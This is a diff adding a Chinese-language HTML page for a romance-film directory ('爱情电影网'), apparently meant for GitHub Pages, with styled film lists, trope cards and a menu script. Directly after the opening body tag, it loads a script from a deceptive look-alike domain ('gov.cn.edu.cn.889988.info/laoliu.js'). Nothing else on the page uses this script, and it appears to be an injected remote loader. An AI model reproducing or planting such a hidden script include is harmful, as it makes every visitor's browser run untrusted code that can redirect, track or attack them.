@@ -1,0 +1,312 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>爱情电影网 - 校园/都市/异地/破镜重圆片单 | aiqingdianyingwangaqdy-h5</title>
+<meta name="description" content="爱情电影网（aiqingdianyingwangaqdy-h5）做爱情片导航：校园暗恋、都市暧昧、异地恋、破镜重圆、婚礼前夜、BE美学，像翻一本情书目录。https://aiqingdianyingwangaqdy-h5.github.io" />
+<meta name="keywords" content="爱情电影网,aiqingdianyingwangaqdy-h5,爱情片,校园暗恋,都市爱情,异地恋电影,破镜重圆,BE美学,片单导航" />
+<link rel="canonical" href="https://aiqingdianyingwangaqdy-h5.github.io/" />
+<meta property="og:title" content="爱情电影网 - 玫瑰金情书风爱情片导航" />
+<meta property="og:description" content="校园暗恋 / 都市暧昧 / 异地恋 / 破镜重圆 / BE美学，像翻一本情书目录。" />
+<meta property="og:type" content="website" />
+<meta property="og:url" content="https://aiqingdianyingwangaqdy-h5.github.io/" />
+<meta name="twitter:card" content="summary_large_image" />
+<style>
+:root{
+  --rose:#e8537a;
+  --rose2:#ff8fab;
+  --gold:#d9a441;
+  --gold2:#f3c969;
+  --paper:#fff7f3;
+  --paper2:#ffe9ef;
+  --ink:#3a2230;
+  --ink2:#7c5a68;
+  --line:#f3c2d2;
+  --night:#2a1622;
+  --shadow:0 6px 0 #e7b7c6;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{
+  background:
+    radial-gradient(1100px 480px at 85% -10%, #ffe1ea 0, transparent 60%),
+    radial-gradient(900px 420px at -5% 8%, #fff0d8 0, transparent 55%),
+    linear-gradient(180deg,#fff7f3,#ffe9ef 55%,#ffe3da);
+  color:var(--ink);
+  font-family:"PingFang SC","Microsoft YaHei",ui-sans-serif,system-ui,"Segoe UI",sans-serif;
+  line-height:1.72;font-size:16px;-webkit-font-smoothing:antialiased;
+}
+a{color:inherit;text-decoration:none}
+.wrap{max-width:1180px;margin:0 auto;padding:0 18px}
+.serif{font-family:Georgia,"Songti SC",serif}
+
+.topbar{position:sticky;top:0;z-index:50;background:rgba(255,247,243,.92);backdrop-filter:blur(10px);border-bottom:2px solid var(--line)}
+.top-in{display:flex;align-items:center;justify-content:space-between;height:62px;gap:12px}
+.logo{display:flex;align-items:center;gap:10px;font-weight:900;color:var(--rose)}
+.logo .heart{width:34px;height:34px;border-radius:50%;background:linear-gradient(135deg,var(--rose2),var(--rose));display:grid;place-items:center;color:#fff;box-shadow:0 3px 0 #d9809c}
+.logo b{font-size:18px;letter-spacing:.5px}
+.logo small{font-size:11px;color:var(--ink2);font-family:ui-monospace,monospace}
+.nav{display:flex;gap:6px;flex-wrap:wrap}
+.nav a{font-size:13px;padding:7px 13px;border-radius:999px;background:#fff;border:1px solid var(--line);color:var(--rose);font-weight:800}
+.nav a:hover{background:var(--rose);color:#fff;border-color:var(--rose)}
+.menu-btn{display:none;width:40px;height:40px;border-radius:10px;border:1px solid var(--line);background:#fff;color:var(--rose);font-size:20px;cursor:pointer}
+
+.hero{padding:46px 0 30px;position:relative;overflow:hidden}
+.hero .glow{position:absolute;inset:0;background:radial-gradient(420px 220px at 92% 0,rgba(232,83,122,.16),transparent 70%),radial-gradient(360px 220px at 0 24%,rgba(217,164,65,.14),transparent 70%);pointer-events:none}
+.hero-grid{display:grid;grid-template-columns:1fr 340px;gap:34px;align-items:center;position:relative}
+.badge{display:inline-block;background:var(--rose);color:#fff;font-family:ui-monospace,monospace;font-size:11px;padding:4px 12px;border-radius:999px;letter-spacing:2px;box-shadow:0 3px 0 #d9809c}
+.hero h1{font-size:clamp(30px,5.5vw,52px);line-height:1.06;font-weight:900;margin:14px 0}
+.hero h1 em{font-style:normal;color:var(--rose)}
+.hero h1 .u{text-decoration:underline wavy var(--gold);text-underline-offset:6px}
+.hero p{color:var(--ink2);max-width:540px;margin-bottom:20px}
+.cta{display:flex;gap:12px;flex-wrap:wrap}
+.btn{padding:12px 22px;border-radius:12px;font-weight:800;font-size:14px;border:0;cursor:pointer;background:linear-gradient(135deg,var(--rose2),var(--rose));color:#fff;box-shadow:var(--shadow)}
+.btn:hover{filter:brightness(1.04)}
+.btn.ghost{background:#fff;color:var(--rose);border:2px solid var(--rose);box-shadow:none}
+.marquee{margin-top:26px;overflow:hidden;white-space:nowrap;border:1px dashed var(--rose);border-radius:10px;padding:9px 0;background:#fff}
+.marquee span{display:inline-block;padding:0 18px;font-size:12px;color:var(--ink2);font-family:ui-monospace,monospace}
+.marquee span::before{content:"💌 ";}
+
+.letter{background:linear-gradient(180deg,#fff,#fff1f5);border:2px solid var(--line);border-radius:18px;padding:22px;box-shadow:var(--shadow);position:relative}
+.letter .stamp{position:absolute;top:14px;right:14px;width:54px;height:54px;border:2px dashed var(--rose);border-radius:8px;display:grid;place-items:center;font-size:22px;color:var(--rose);transform:rotate(8deg)}
+.letter .cap{font-family:ui-monospace,monospace;font-size:10px;letter-spacing:3px;color:var(--rose);margin-bottom:8px}
+.letter .big{font-family:Georgia,serif;font-size:24px;font-weight:900;line-height:1.25}
+.letter .big em{font-style:normal;color:var(--rose)}
+.letter .lines{margin-top:12px;font-size:13px;color:var(--ink2);line-height:1.8}
+.letter .sign{margin-top:10px;font-family:Georgia,serif;font-style:italic;color:var(--gold);font-weight:800}
+
+.sec{padding:38px 0;border-bottom:1px dashed var(--line)}
+.sec-head{display:flex;align-items:center;gap:12px;margin-bottom:22px}
+.sec-head .tag{background:var(--rose);color:#fff;font-weight:900;padding:4px 12px;border-radius:8px;font-size:12px;letter-spacing:1px}
+.sec-head h2{font-size:22px;font-weight:900}
+.sec-head a{margin-left:auto;font-size:13px;color:var(--rose);font-weight:800;border-bottom:1px dashed var(--rose)}
+
+.grid{display:grid;grid-template-columns:repeat(3,1fr);gap:18px}
+.card{background:#fff;border:2px solid var(--line);border-radius:16px;overflow:hidden;box-shadow:var(--shadow);display:flex;flex-direction:column;transition:transform .14s}
+.card:hover{transform:translateY(-4px)}
+.card .cover{aspect-ratio:3/4;display:grid;place-items:center;font-size:54px;position:relative;border-bottom:2px solid var(--line)}
+.card .cover .pill{position:absolute;top:10px;left:10px;background:#fff;color:var(--rose);font-size:11px;font-weight:800;padding:3px 9px;border-radius:999px;border:1px solid var(--line)}
+.card .cover .heart{position:absolute;top:10px;right:10px;background:rgba(255,255,255,.9);border:1px solid var(--line);border-radius:999px;width:30px;height:30px;display:grid;place-items:center;font-size:14px;cursor:pointer}
+.card .body{padding:14px;display:flex;flex-direction:column;gap:8px}
+.card h3{font-size:16px;font-weight:850}
+.card .sub{font-size:12px;color:var(--ink2)}
+.card .tags{display:flex;gap:6px;flex-wrap:wrap}
+.card .tags span{font-size:11px;padding:2px 8px;border-radius:999px;background:var(--paper2);color:var(--rose);border:1px solid var(--line)}
+.card .row{display:flex;align-items:center;justify-content:space-between;margin-top:2px}
+.card .rate{font-family:ui-monospace,monospace;font-weight:800;color:var(--rose)}
+.card .watch{background:var(--rose);color:#fff;font-size:12px;font-weight:800;padding:6px 12px;border-radius:10px}
+.c1{background:linear-gradient(135deg,#ffd7e6,#ff8fab)}
+.c2{background:linear-gradient(135deg,#ffe9c7,#f3c969)}
+.c3{background:linear-gradient(135deg,#e7d7ff,#c9b6ff)}
+.c4{background:linear-gradient(135deg,#ffe0d6,#ff9a8a)}
+.c5{background:linear-gradient(135deg,#d8f6ec,#9fe6cd)}
+.c6{background:linear-gradient(135deg,#ffe1ef,#ff7eb3)}
+
+.mood2{display:grid;grid-template-columns:1fr 1fr;gap:16px}
+.mcard{background:#fff;border:2px solid var(--line);border-radius:14px;padding:18px;display:grid;grid-template-columns:54px 1fr;gap:14px;align-items:start}
+.mcard .ic{width:54px;height:54px;border-radius:14px;display:grid;place-items:center;font-size:26px;background:var(--paper2);border:1px solid var(--line)}
+.mcard h3{font-size:15px;font-weight:850}
+.mcard p{font-size:13px;color:var(--ink2);margin-top:4px}
+.mcard .line{margin-top:8px;font-family:Georgia,serif;font-style:italic;color:var(--rose);font-size:13px}
+
+.wall{display:grid;grid-template-columns:repeat(4,1fr);gap:14px}
+.tile{background:#fff;border:2px solid var(--line);border-radius:14px;padding:16px;text-align:center}
+.tile .em{font-size:30px}
+.tile h4{font-size:14px;font-weight:850;margin:8px 0 4px}
+.tile p{font-size:11px;color:var(--ink2)}
+
+.about{display:grid;grid-template-columns:1.3fr .7fr;gap:0;border:2px solid var(--line);border-radius:16px;overflow:hidden;box-shadow:var(--shadow)}
+.about .l{padding:24px;background:#fff;border-right:2px solid var(--line)}
+.about .l h3{font-size:20px;font-weight:900;margin-bottom:10px;color:var(--rose)}
+.about .l p{color:var(--ink2);font-size:14px;margin-bottom:10px}
+.about .r{background:var(--paper2);padding:24px;font-size:13px;color:var(--ink2)}
+.about .r li{list-style:none;padding:8px 0;border-bottom:1px dashed var(--line)}
+.about .r li:before{content:"🌹 ";}
+
+.foot{border-top:3px solid var(--rose);padding:30px 0;background:var(--paper2)}
+.fg{display:grid;grid-template-columns:1.5fr 1fr 1fr 1fr;gap:20px}
+.foot h4{font-size:12px;letter-spacing:2px;text-transform:uppercase;color:var(--rose);margin-bottom:12px}
+.foot a{display:block;font-size:13px;color:var(--ink2);padding:4px 0}
+.foot a:hover{color:var(--rose)}
+.url{display:inline-block;margin-top:8px;font-family:ui-monospace,monospace;font-size:12px;border:1px dashed var(--rose);padding:6px 10px;border-radius:8px;color:var(--rose)}
+.copy{margin-top:20px;text-align:center;font-size:11px;color:var(--ink2);opacity:.75}
+
+.drawer{position:fixed;inset:0 0 0 auto;width:260px;background:#fff;border-left:3px solid var(--rose);z-index:60;padding:22px;transform:translateX(100%);transition:transform .28s;display:flex;flex-direction:column;gap:8px}
+.drawer.open{transform:none}
+.drawer a{padding:12px;border-radius:10px;background:var(--paper2);font-weight:800;color:var(--rose);border:1px solid var(--line)}
+.drawer .x{align-self:flex-end;background:none;border:0;font-size:24px;color:var(--rose);cursor:pointer}
+.mask{position:fixed;inset:0;background:rgba(58,34,48,.5);z-index:55;display:none}
+.mask.show{display:block}
+
+@media(max-width:1024px){
+  .hero-grid{grid-template-columns:1fr}
+  .grid{grid-template-columns:repeat(2,1fr)}
+  .wall{grid-template-columns:repeat(2,1fr)}
+  .about{grid-template-columns:1fr}
+  .about .l{border-right:none;border-bottom:2px solid var(--line)}
+  .fg{grid-template-columns:1fr 1fr}
+}
+@media(max-width:768px){
+  .nav{display:none}
+  .menu-btn{display:block}
+  .grid{grid-template-columns:1fr}
+  .mood2{grid-template-columns:1fr}
+  .fg{grid-template-columns:1fr}
+}
+@media(max-width:440px){.wall{grid-template-columns:1fr}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="topbar">
+  <div class="wrap top-in">
+    <div class="logo"><span class="heart">♥</span><div><b>爱情电影网</b><br><small>aiqingdianyingwangaqdy-h5</small></div></div>
+    <nav class="nav" id="nav">
+      <a href="#campus">校园暗恋</a>
+      <a href="#city">都市暧昧</a>
+      <a href="#tropes">爱情母题</a>
+      <a href="#endings">HE / BE</a>
+      <a href="#about">关于本站</a>
+    </nav>
+    <button class="menu-btn" id="menuBtn">☰</button>
+  </div>
+</header>
+
+<main class="wrap">
+
+  <section class="hero">
+    <div class="glow"></div>
+    <div class="hero-grid">
+      <div>
+        <span class="badge">LOVE FILM CLUB · 爱情片导航</span>
+        <h1>爱情电影网：<br/>把片子当成<span class="u">没寄出的情书</span></h1>
+        <p>爱情电影网（aiqingdianyingwangaqdy-h5）不吹“免费高清秒播”，只做爱情片导航：校园暗恋、都市暧昧、异地恋、破镜重圆、婚礼前夜、BE 美学——像翻一本情书目录，每一部都写着“你也这样爱过吧”。</p>
+        <div class="cta">
+          <a href="#campus" class="btn">翻校园暗恋</a>
+          <a href="#endings" class="btn ghost">看 HE / BE 片单</a>
+        </div>
+        <div class="marquee">
+          <span>五月来信 青春暗恋</span><span>夜曲都市 都市暧昧</span><span>七月和剩下的我们 破镜重圆</span><span>晚风邮差 独处治愈</span><span>长安灯市录 古装情缘</span><span>山海钟鸣 奇幻羁绊</span><span>失重海岸 太空异地</span>
+        </div>
+      </div>
+      <aside class="letter">
+        <div class="stamp">✉️</div>
+        <div class="cap">A LETTER, NOT A STREAM</div>
+        <div class="big serif">“我们没在一起，<br/>但那部电影<span>替我们谈完了</span>。”</div>
+        <div class="lines">
+          亲爱的影迷：<br/>
+          这一页没有播放器，只有片单。<br/>
+          点开一部，像拆开一封旧信——<br/>
+          开头是心跳，结尾可能是拥抱，也可能是雨。
+        </div>
+        <div class="sign">— 爱情电影网 谨上</div>
+      </aside>
+    </div>
+  </section>
+
+  <section class="sec" id="campus">
+    <div class="sec-head"><span class="tag">校园</span><h2>校园暗恋 / 青春初恋</h2><a href="#">全部青春片 #</a></div>
+    <div class="grid">
+      <article class="card"><div class="cover c1">📚<span class="pill">校园·暗恋</span><span class="heart">♡</span></div><div class="body"><h3>五月来信</h3><div class="sub">后排座位 / 没递出的信 / 毕业照角落</div><div class="tags"><span>青春</span><span>暗恋</span><span>书信</span></div><div class="row"><span class="rate">8.6</span><a href="#" class="watch">加入片单</a></div></div></article>
+      <article class="card"><div class="cover c2">🎒<span class="pill">同桌·初恋</span><span class="heart">♡</span></div><div class="body"><h3>橡皮屑与晚自习</h3><div class="sub">借半块橡皮，还了一整个夏天</div><div class="tags"><span>校园</span><span>初恋</span><span>治愈</span></div><div class="row"><span class="rate">8.3</span><a href="#" class="watch">加入片单</a></div></div></article>
+      <article class="card"><div class="cover c3">🎞️<span class="pill">毕业·散场</span><span class="heart">♡</span></div><div class="body"><h3>散场后去天台</h3><div class="sub">毕业典礼结束，两个人留在天台</div><div class="tags"><span>青春</span><span>离别</span><span>群像</span></div><div class="row"><span class="rate">8.5</span><a href="#" class="watch">加入片单</a></div></div></article>
+    </div>
+  </section>
+
+  <section class="sec" id="city">
+    <div class="sec-head"><span class="tag">都市</span><h2>都市暧昧 / 成年人的喜欢</h2><a href="#">全部都市爱情 #</a></div>
+    <div class="grid">
+      <article class="card"><div class="cover c4">🏙️<span class="pill">都市·暧昧</span><span class="heart">♡</span></div><div class="body"><h3>电梯里的第 12 层</h3><div class="sub">加班、咖啡、欲言又止的“要不要一起吃饭”</div><div class="tags"><span>都市</span><span>职场</span><span>慢热</span></div><div class="row"><span class="rate">8.4</span><a href="#" class="watch">加入片单</a></div></div></article>
+      <article class="card"><div class="cover c5">🎤<span class="pill">音乐·相遇</span><span class="heart">♡</span></div><div class="body"><h3>夜曲都市</h3><div class="sub">驻唱女孩 × 失眠听众，麦克风比人诚实</div><div class="tags"><span>音乐</span><span>都市</span><span>传记</span></div><div class="row"><span class="rate">8.5</span><a href="#" class="watch">加入片单</a></div></div></article>
+      <article class="card"><div class="cover c6">🌧️<span class="pill">合租·靠近</span><span class="heart">♡</span></div><div class="body"><h3>隔壁那盏灯</h3><div class="sub">合租屋、共享冰箱、凌晨厨房的对话</div><div class="tags"><span>都市</span><span>合租</span><span>日常</span></div><div class="row"><span class="rate">8.2</span><a href="#" class="watch">加入片单</a></div></div></article>
+    </div>
+  </section>
+
+  <section class="sec" id="tropes">
+    <div class="sec-head"><span class="tag">母题</span><h2>爱情片里百看不厌的梗</h2><a href="#">更多母题 #</a></div>
+    <div class="mood2">
+      <div class="mcard"><div class="ic">✈️</div><div><h3>异地恋</h3><p>时差、视频通话、登机牌、一句“我这边下雪了”。</p><div class="line">“我们之间隔的不是人，是地图。”</div></div></div>
+      <div class="mcard"><div class="ic">🪞</div><div><h3>破镜重圆</h3><p>几年后重逢，旧歌一响，所有借口都失效。</p><div class="line">“我没变，只是更会藏了。”</div></div></div>
+      <div class="mcard"><div class="ic">⏳</div><div><h3>时间循环</h3><p>同一天遇见同一个人，终于学会怎么开口。</p><div class="line">“再给我一天，我就会说了。”</div></div></div>
+      <div class="mcard"><div class="ic">💍</div><div><h3>婚礼前夜</h3><p>明天结婚，今晚却想起那个“本来可以是他”的人。</p><div class="line">“我祝福自己，也偷偷想念你。”</div></div></div>
+    </div>
+  </section>
+
+  <section class="sec" id="endings">
+    <div class="sec-head"><span class="tag">结局</span><h2>HE 治愈厅 / BE 美学厅</h2><a href="#">全部结局分类 #</a></div>
+    <div class="wall">
+      <div class="tile"><div class="em">🌤️</div><h4>雨后拥抱</h4><p>误会解开，伞歪向她，两个人都淋了一半</p></div>
+      <div class="tile"><div class="em">✉️</div><h4>迟到的信</h4><p>十年后收到回信：我也喜欢过你</p></div>
+      <div class="tile"><div class="em">🌌</div><h4>BE 美学</h4><p>没在一起，但那首主题曲听一辈子</p></div>
+      <div class="tile"><div class="em">🚪</div><h4>关门镜头</h4><p>他没追上去，镜头停在走廊，字幕起</p></div>
+      <div class="tile"><div class="em">🕊️</div><h4>遗憾成诗</h4><p>不圆满，但比圆满更让人记得</p></div>
+      <div class="tile"><div class="em">🔁</div><h4>重逢续写</h4><p>第二部里他们老了，反而更会爱了</p></div>
+      <div class="tile"><div class="em">🎁</div><h4>隐藏彩蛋</h4><p>片尾三分钟后，他真的来了</p></div>
+      <div class="tile"><div class="em">📼</div><h4>老片重看</h4><p>二十岁看甜，三十岁看哭，四十岁看懂</p></div>
+    </div>
+  </section>
+
+  <section class="sec" id="about">
+    <div class="sec-head"><span class="tag">i</span><h2>关于爱情电影网</h2></div>
+    <div class="about">
+      <div class="l">
+        <h3>不是“刺激爽片”，是“看完想给谁发条消息”的片子</h3>
+        <p>爱情电影网（aiqingdianyingwangaqdy-h5）是爱情片导航演示站：校园暗恋、都市暧昧、异地恋、破镜重圆、HE/BE 美学。排片逻辑不是“吻戏够不够多”，而是“这部片会不会让人想起某个人”。</p>
+        <p>单文件 index.html、CSS/JS 内联、移动端自适应，适合 GitHub Pages 托管，也适合做爱情片书签站、约会片单站、影评入口站。</p>
+        <p>不提供盗版资源下载与在线盗播；片名、评分、类型仅作分类导航与检索用途。站名含 aqdy 仅为域名片段，不代表与任何老牌盗版影站有关联。</p>
+      </div>
+      <ul class="r">
+        <li>玫瑰金 + 信纸 + 双人椅</li>
+        <li>校园 / 都市 / 异地 / 破镜重圆</li>
+        <li>HE 治愈厅 + BE 美学厅</li>
+        <li>爱情母题单独成区</li>
+        <li>内链用 #，不伪造深链</li>
+        <li>必应友好：标题/描述/canonical 齐</li>
+      </ul>
+    </div>
+  </section>
+
+</main>
+
+<footer class="foot">
+  <div class="wrap">
+    <div class="fg">
+      <div>
+        <h4>爱情电影网</h4>
+        <p style="font-size:13px;color:var(--ink2)">爱情片导航：校园暗恋、都市暧昧、异地恋、破镜重圆、HE/BE 美学。</p>
+        <span class="url">https://aiqingdianyingwangaqdy-h5.github.io</span>
+      </div>
+      <div><h4>片单</h4><a href="#campus">校园暗恋 #</a><a href="#city">都市暧昧 #</a><a href="#tropes">爱情母题 #</a><a href="#endings">HE/BE #</a></div>
+      <div><h4>类型</h4><a href="#">青春书信 #</a><a href="#">职场慢热 #</a><a href="#">异地时差 #</a><a href="#">古装情缘 #</a></div>
+      <div><h4>站点</h4><a href="#campus">校园暗恋 #</a><a href="#city">都市暧昧 #</a><a href="#tropes">爱情母题 #</a><a href="#about">关于本站 #</a></div>
+    </div>
+    <div class="copy">© 2026 爱情电影网 aiqingdianyingwangaqdy-h5 · 爱情片导航演示，不提供盗版资源下载与在线盗播。aqdy 仅为域名片段，不与任何盗版影站关联。</div>
+  </div>
+</footer>
+
+<div class="mask" id="mask"></div>
+<aside class="drawer" id="drawer">
+  <button class="x" id="drawerClose">×</button>
+  <a href="#campus">校园暗恋</a>
+  <a href="#city">都市暧昧</a>
+  <a href="#tropes">爱情母题</a>
+  <a href="#endings">HE / BE</a>
+  <a href="#about">关于本站</a>
+</aside>
+
+<script>
+  var menuBtn=document.getElementById('menuBtn');
+  var drawer=document.getElementById('drawer');
+  var mask=document.getElementById('mask');
+  var close=document.getElementById('drawerClose');
+  menuBtn.addEventListener('click',function(){drawer.classList.add('open');mask.classList.add('show')});
+  close.addEventListener('click',function(){drawer.classList.remove('open');mask.classList.remove('show')});
+  mask.addEventListener('click',function(){drawer.classList.remove('open');mask.classList.remove('show')});
+  drawer.querySelectorAll('a').forEach(function(a){a.addEventListener('click',function(){drawer.classList.remove('open');mask.classList.remove('show')})});
+  document.querySelectorAll('.heart').forEach(function(h){h.addEventListener('click',function(){h.textContent=h.textContent==='♡'?'♥':'♡';h.style.color=h.textContent==='♥'?'#e8537a':''})});
+</script>
+</body>
+</html>
